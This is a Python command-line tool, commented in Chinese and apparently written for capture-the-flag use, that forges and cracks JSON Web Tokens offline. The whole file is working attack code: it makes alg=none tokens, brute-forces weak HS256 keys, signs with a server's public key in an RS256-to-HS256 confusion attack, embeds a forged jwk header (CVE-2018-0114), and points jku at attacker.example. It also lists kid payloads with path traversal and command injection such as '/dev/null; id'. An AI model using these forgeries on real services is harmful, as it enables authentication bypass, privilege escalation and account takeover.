#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""JWT 伪造辅助（离线）：alg=none / HS256 弱密钥爆破 / RS256→HS256 混淆 / kid 与 jku / jwk 内嵌 / 解码。

纯标准库、离线：不做任何网络请求，不做公钥解析（RS256 签名由外部 openssl 完成）。
"""
import argparse
import base64
import binascii
import hashlib
import hmac
import json
import sys

DEFAULT_WORDS = ("secret", "password", "123456", "admin", "jwt", "key", "changeme", "flag")
NONE_VARIANTS = ("none", "None", "NONE", "nOnE")
KID_PAYLOADS = [
    "../../../../dev/null",
    "../../dev/null",
    "/dev/null",
    "aaa/../../../../dev/null",
    "/dev/null; id",
    "/dev/null; sleep 3",
    "/proc/self/environ",
    "/flag",
]
JWK_HEADER_B64 = "eyJrdHkiOiJSU0EiLCJhbGciOiJSUzI1NiIsIm4iOiJBS0R1cE9fIiwiZSI6IkFRQUIifQ"


class JwtError(ValueError):
    pass


def b64u(data):
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64u_dec(text):
    if isinstance(text, bytes):
        text = text.decode("ascii")
    if not isinstance(text, str) or not text:
        raise JwtError("待解码内容为空")
    if not all(c.isalnum() or c in "-_=" for c in text):
        raise JwtError("不是合法 base64url：%r" % (text[:20],))
    text += "=" * (-len(text) % 4)
    try:
        return base64.urlsafe_b64decode(text.encode("ascii"))
    except (binascii.Error, ValueError) as e:
        raise JwtError("base64url 解码失败：%s" % e)


def _seg(obj):
    if isinstance(obj, dict):
        return b64u(json.dumps(obj, separators=(",", ":"), ensure_ascii=False))
    raise JwtError("header/payload 必须是 dict")


def _sign(h, p, key):
    return b64u(hmac.new(key, ("%s.%s" % (h, p)).encode("ascii"), hashlib.sha256).digest())


def forge_none(payload, variant="none"):
    """alg=none：签名段留空。"""
    if variant not in NONE_VARIANTS:
        raise JwtError("variant 只能是 %s" % "/".join(NONE_VARIANTS))
    h = _seg({"alg": variant, "typ": "JWT"})
    p = _seg(payload)
    return "%s.%s." % (h, p)


def forge_hs256(payload, key, header=None):
    """标准 HS256 签名；key 可为 bytes/str。"""
    if not key:
        raise JwtError("HS256 需要密钥（空密钥请用 forge_none 思路或 kid 打 /dev/null）")
    if isinstance(key, str):
        key = key.encode("utf-8")
    head = {"alg": "HS256", "typ": "JWT"}
    if header:
        head.update(header)
    h = _seg(head)
    p = _seg(payload)
    return "%s.%s.%s" % (h, p, _sign(h, p, key))


def forge_rs256_as_hs256(payload, pubkey, as_pem=True):
    """算法混淆：把服务端公钥当 HMAC 密钥签 HS256。"""
    if not pubkey:
        raise JwtError("需要公钥内容（PEM 或 DER 的字节）")
    if isinstance(pubkey, str):
        pubkey = pubkey.encode("utf-8")
    if as_pem and b"-----BEGIN" not in pubkey:
        raise JwtError("as_pem=True 时传入的应是 PEM 文本（含 -----BEGIN）")
    return forge_hs256(payload, pubkey, header={"typ": "JWT"})


def forge_jwk(payload, n="AKDupO_", e="AQAB"):
    """CVE-2018-0114：header 里内嵌公钥，服务端若用它验签即可伪造。"""
    if not n or not e:
        raise JwtError("jwk 的 n/e 不能为空")
    h = b64u(json.dumps({"typ": "JWT", "alg": "RS256", "jwk": {"kty": "RSA", "n": n, "e": e}},
                        separators=(",", ":")))
    p = _seg(payload)
    return "%s.%s.%s" % (h, p, b64u(b"\x00"))


def forge_kid(payload, kid="/dev/null", key=""):
    """kid 指向空文件/可预测文件时，用对应内容当 HMAC 密钥。"""
    if not kid or not isinstance(kid, str):
        raise JwtError("kid 不能为空")
    if isinstance(key, str):
        key = key.encode("utf-8")
    return forge_hs256(payload, key or b"_", header={"kid": kid}) if key else \
        "%s.%s.%s" % (_seg({"alg": "HS256", "typ": "JWT", "kid": kid}),
                      _seg(payload), _sign(_seg({"alg": "HS256", "typ": "JWT", "kid": kid}), _seg(payload), b""))


def forge_jku(payload, jku="https://attacker.example/jwks.json", kid="k1"):
    """jku 指向自己的 JWKS：用自己私钥签 RS256 后把 header 的 jku/kid 指过去。"""
    if not jku.lower().startswith("https://"):
        raise JwtError("jku 白名单常要求 https，收到 %r" % (jku,))
    h = _seg({"alg": "RS256", "typ": "JWT", "kid": kid, "jku": jku})
    return "%s.%s." % (h, _seg(payload))


def decode(token):
    """解码 JWT，返回 (header, payload, sig_len)。"""
    if not token or token.count(".") != 2 or token.startswith(".") or token.endswith(".."):
        raise JwtError("JWT 必须是三段 x.y.z（签名可为空但点不能少）：%r" % (token[:30],))
    h, p, s = token.split(".")
    try:
        hd = json.loads(b64u_dec(h))
        pd = json.loads(b64u_dec(p))
    except json.JSONDecodeError as e:
        raise JwtError("JSON 解析失败：%s" % e)
    return hd, pd, len(s)


def b64_decode(token):
    """宽容解码（兼容 base64 或 base64url）。"""
    if not token or not isinstance(token, str):
        raise JwtError("需要字符串")
    t = token.replace("-", "+").replace("_", "/")
    t += "=" * (-len(t) % 4)
    try:
        return base64.b64decode(t)
    except (binascii.Error, ValueError) as e:
        raise JwtError("base64 解码失败：%s" % e)


def crack_hs256(token, words=None, wordlist=None):
    """字典爆破 HS256；words 为 list，wordlist 为文件路径。返回命中的密钥 bytes 或 None。"""
    hd, _pd, _n = decode(token)
    if str(hd.get("alg", "")).upper() != "HS256":
        raise JwtError("token 的 alg 是 %r，不是 HS256；请改用 --confuse 或手工伪造" % (hd.get("alg"),))
    parts = token.split(".")
    target = parts[2]
    cands = list(words or [])
    if wordlist:
        try:
            with open(wordlist, "rb") as f:
                cands.extend([ln.rstrip(b"\r\n") for ln in f])
        except OSError as e:
            raise JwtError("读取字典失败：%s" % e)
    if not cands:
        cands = [w.encode() for w in DEFAULT_WORDS]
    signing_input = ("%s.%s" % (parts[0], parts[1])).encode("ascii")
    for w in cands:
        wb = w.encode("utf-8") if isinstance(w, str) else w
        if b64u(hmac.new(wb, signing_input, hashlib.sha256).digest()) == target:
            return wb
    return None


def guess_alg(header):
    """按 header 给攻击顺序建议。"""
    alg = str((header or {}).get("alg", "")).upper()
    tips = []
    if not alg:
        tips.append("header 无 alg：试 none 系列与 HS256")
    if alg in ("RS256", "RS384", "RS512", "ES256"):
        tips.append("非对称算法：先试 RS256→HS256 混淆（公钥当 HMAC 密钥）")
        tips.append("再试 jku/x5u 指向自己的 JWKS，最后试 jwk 内嵌（CVE-2018-0114）")
    if alg.startswith("HS"):
        tips.append("对称算法：先 alg=none / 空签名，再字典爆破弱密钥")
    if "kid" in (header or {}):
        tips.append("header 含 kid：试路径穿越到 /dev/null 或命令注入")
    if "jku" in (header or {}) or "x5u" in (header or {}):
        tips.append("header 含 jku/x5u：托管自己的 JWKS 或找白名单绕过")
    return tips or ["算法未知：先解码确认 alg 再选攻击面"]


def selftest():
    fails = []

    # 1. 正常路径：none / HS256 结构与可解码
    payload = {"user": "admin", "role": "admin"}
    n = forge_none(payload)
    if not n.endswith(".") or n.count(".") != 2:
        fails.append("case1: none token 应三段且签名空 %r" % n)
    hd, pd, slen = decode(n)
    if hd.get("alg") != "none" or pd.get("user") != "admin" or slen != 0:
        fails.append("case1b: decode 结果错 %r %r %r" % (hd, pd, slen))
    if forge_none(payload, "nOnE").split(".")[0] == n.split(".")[0]:
        fails.append("case1c: 大小写变体应改变 header")

    # 2. 正常路径：HS256 签名可复算、爆破能命中
    t = forge_hs256(payload, "secret")
    if t.count(".") != 2 or not t.split(".")[2]:
        fails.append("case2: HS256 token 结构错")
    if crack_hs256(t) != b"secret":
        fails.append("case2b: 默认字典未爆出 secret")
    if crack_hs256(t, words=["a", "b"]) is not None:
        fails.append("case2c: 不在字典里却报命中")
    if forge_hs256(payload, "x") == forge_hs256(payload, "y"):
        fails.append("case2d: 不同密钥应产生不同签名")

    # 3. 正常路径：算法混淆 / jku / jwk / kid
    pem = b"-----BEGIN PUBLIC KEY-----\nQUJD\n-----END PUBLIC KEY-----\n"
    c = forge_rs256_as_hs256(payload, pem)
    if decode(c)[0]["alg"] != "HS256":
        fails.append("case3: 混淆后 alg 应为 HS256")
    if not c.endswith(forge_hs256(payload, pem).split(".")[2]):
        fails.append("case3b: 混淆签名应等价于用 PEM 做 HMAC 密钥")
    j = forge_jku(payload)
    if "jku" not in decode(j)[0] or decode(j)[2] != 0:
        fails.append("case3c: jku token 应带 jku 且签名留空")
    k = forge_jwk(payload)
    if "jwk" not in decode(k)[0]:
        fails.append("case3d: jwk token 缺 jwk 头")
    if guess_alg({"alg": "RS256", "kid": "x"}) == []:
        fails.append("case3e: guess_alg 无建议")

    # 4. 边界：提示与宽容解码
    tips = " ".join(guess_alg({"alg": "RS256"}))
    if "混淆" not in tips or "jwk" not in tips:
        fails.append("case4: RS256 建议不全 %r" % tips)
    if "kid" not in " ".join(guess_alg({"alg": "HS256", "kid": "k"})):
        fails.append("case4b: 含 kid 时未提示路径穿越")
    if b64_decode("eyJhIjoxfQ") != b'{"a":1}':
        fails.append("case4c: 宽容解码错")
    if len(KID_PAYLOADS) < 6:
        fails.append("case4d: kid payload 清单太少")

    # 5. 坏输入拒绝
    bad = [
        ("非三段", lambda: decode("a.b")),
        ("空 token", lambda: decode("")),
        ("空密钥", lambda: forge_hs256(payload, "")),
        ("未知 none 变体", lambda: forge_none(payload, "null")),
        ("PEM 标志不符", lambda: forge_rs256_as_hs256(payload, b"notpem", as_pem=True)),
        ("http 的 jku", lambda: forge_jku(payload, "http://x/j.json")),
        ("空 kid", lambda: forge_kid(payload, "")),
        ("非 HS256 爆破", lambda: crack_hs256(forge_none(payload))),
        ("payload 非 dict", lambda: forge_none(["a"])),
    ]
    for name, fn in bad:
        try:
            fn()
            fails.append("case5: %s 未被拒绝" % name)
        except JwtError:
            pass

    # 6. 参数不足
    tiny = argparse.ArgumentParser(prog="jwt_forge", add_help=False)
    tiny.exit = lambda status=0, message=None: (_ for _ in ()).throw(SystemExit(status))
    tiny._print_message = lambda message, file=None: None
    tiny.add_argument("--x")
    try:
        tiny.error("需要 --decode/--none/--hs256/--confuse/--crack/--kid/--jku/--jwk；或用 --selftest")
        fails.append("case6: ap.error 未抛 SystemExit")
    except SystemExit as e:
        if e.code != 2:
            fails.append("case6: 退出码 %r" % (e.code,))

    for f in fails:
        print("FAIL %s" % f, file=sys.stderr)
    if fails:
        return 1
    print("selftest ok: 6/6（none与解码、HS256签名与爆破、混淆与jku/jwk/kid、建议与宽容解码、坏输入拒绝、参数不足）")
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser(description="JWT 伪造辅助：none / HS256 爆破 / 算法混淆 / kid·jku·jwk（离线）")
    ap.add_argument("--decode", metavar="TOKEN", default=None, help="解码 JWT 并给攻击建议")
    ap.add_argument("--none", action="store_true", help="生成 alg=none token")
    ap.add_argument("--variant", default="none", choices=list(NONE_VARIANTS))
    ap.add_argument("--hs256", nargs="?", const="secret", default=None, metavar="KEY", help="用指定密钥签 HS256")
    ap.add_argument("--confuse", metavar="PUBPEM", default=None, help="RS256→HS256：用公钥 PEM 文件当 HMAC 密钥")
    ap.add_argument("--crack", metavar="TOKEN", default=None, help="字典爆破 HS256 密钥")
    ap.add_argument("--wordlist", default=None, help="字典文件路径")
    ap.add_argument("--kid", nargs="?", const="/dev/null", default=None, help="生成 kid 注入 token（key 可为空）")
    ap.add_argument("--key", default="", help="配合 --kid 的密钥内容")
    ap.add_argument("--jku", metavar="URL", default=None, help="生成带 jku 的 token")
    ap.add_argument("--jwk", action="store_true", help="生成 jwk 内嵌 token（CVE-2018-0114）")
    ap.add_argument("--payload", default='{"user":"admin","role":"admin"}', help="payload JSON")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)

    if args.selftest:
        return selftest()
    try:
        payload = json.loads(args.payload)
        if args.decode is not None:
            hd, pd, slen = decode(args.decode)
            print("[header ] %s" % json.dumps(hd, ensure_ascii=False))
            print("[payload] %s" % json.dumps(pd, ensure_ascii=False))
            print("[sig    ] %d 字符" % slen)
            for t in guess_alg(hd):
                print("    - %s" % t)
            return 0
        if args.crack is not None:
            w = crack_hs256(args.crack, wordlist=args.wordlist)
            if w is None:
                print("[*] 字典未命中：换 rockyou 或试 hashcat -m 16500")
                return 0
            print("[+] 密钥：%s" % w.decode("utf-8", "replace"))
            return 0
        if args.confuse is not None:
            with open(args.confuse, "rb") as f:
                pub = f.read()
            print(forge_rs256_as_hs256(payload, pub))
            return 0
        if args.kid is not None:
            print(forge_kid(payload, args.kid, args.key))
            return 0
        if args.jku is not None:
            print(forge_jku(payload, args.jku))
            return 0
        if args.jwk:
            print(forge_jwk(payload))
            return 0
        if args.hs256 is not None:
            print(forge_hs256(payload, args.hs256))
            return 0
        if args.none:
            print(forge_none(payload, args.variant))
            return 0
        ap.error("需要 --decode/--none/--hs256/--confuse/--crack/--kid/--jku/--jwk；或用 --selftest")
        return 2
    except JwtError as e:
        print("错误：%s" % e, file=sys.stderr)
        return 2
    except json.JSONDecodeError as e:
        print("错误：--payload 不是合法 JSON：%s" % e, file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
